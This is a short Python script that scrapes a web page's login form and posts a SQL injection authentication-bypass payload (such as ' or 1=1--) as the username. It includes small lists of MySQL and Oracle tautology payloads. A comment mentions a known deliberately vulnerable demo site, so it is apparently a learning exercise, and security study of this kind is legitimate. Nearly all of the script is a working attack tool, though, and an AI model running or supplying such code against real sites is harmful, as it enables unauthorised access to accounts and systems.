import sys
import requests
from bs4 import BeautifulSoup
import re

def help():
    print('Usage: ./main url')
    sys.exit(1)

def sqlinjection(): # have to update
    sqlinjection_mysql = ['or 1=1--',
                          '\' or 1=1--',
                          '\" or 1=1--',
                          '\' or \'1\'=\'1',
                          '\" or \"1\"=\"1']

    sqlinjection_oracle = ['\' or 1=1#',
                           '\" or 1=1#',
                           'or 1=1#',
                           '\' or \'1\'=\'1',
                           '\" or \"1\"=\"1']
    return sqlinjection_mysql[1]

def send_post(data, next_url):

    # data example
    # data = {
    #           id_value: 'id',
    #           pw_value: 'donecare'
    # }

    header = {
        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
    }

    resp = requests.post(next_url, data=data, headers=header)
    print("Send post packet")
    return resp
    # If you get response html code, use print(resp.text) code.

def get_domain(url):
    domainp = '^(https?:\/\/)?([\da-z\.-]+)'
    domain = re.compile(domainp).match(url).group()
    print("\nDomain = " + domain) # http://demo.testfire.net
    return domain

if __name__ == '__main__':
    if (len(sys.argv) != 2):
        help()

    # id input tag
    url = str(sys.argv[1])
    r = requests.get(url).text
    soup = BeautifulSoup(r, 'html.parser')
    tags = soup.select("form input")

    idp = re.compile("id=\"[a-zA-Z]*id[a-z]*\"") # Find <id="-- id --"> in input tag
    for tag in tags:
        try:
            result = idp.search(str(tag)).group()
            id_value = result.replace("id=", "").replace("\"", "")
            print(id_value)
            break
        except AttributeError:
            result = None
        # https://stackoverflow.com/questions/30963705/python-regex-attributeerror-nonetype-object-has-no-attribute-group/30964049

    # pw input tag
    pw_value = soup.select('form input[type=password]')[0]['name']
    print(pw_value)

    # submit button
    submit = soup.select('form input[type=submit]')
    submitp = re.compile("\"[a-zA-Z]*[L|l]ogin[a-zA-Z]*\"")
    subnetname = submitp.search(str(submit)).group().replace("\"", "")

    # next page = form action
    tags = soup.select("form")
    formp = re.compile("<form action=\"[a-zA-Z]*[L|l]ogin\"") # Find login form
    actionvaluep = re.compile("\"[a-zA-Z]*\"")
    for tag in tags:
        result = formp.search(str(tag))
        if result != None:
            action_value = actionvaluep.search(result.group()).group().replace("\"", "") # action attribute
            print(action_value)

    domain = get_domain(url)
    next_url = domain + "/" + action_value

    # Send post
    print("\nSend post packet")
    data = {id_value:sqlinjection(),
            pw_value:'donecare'}
    print(data)
    send_post(data, next_url)
   
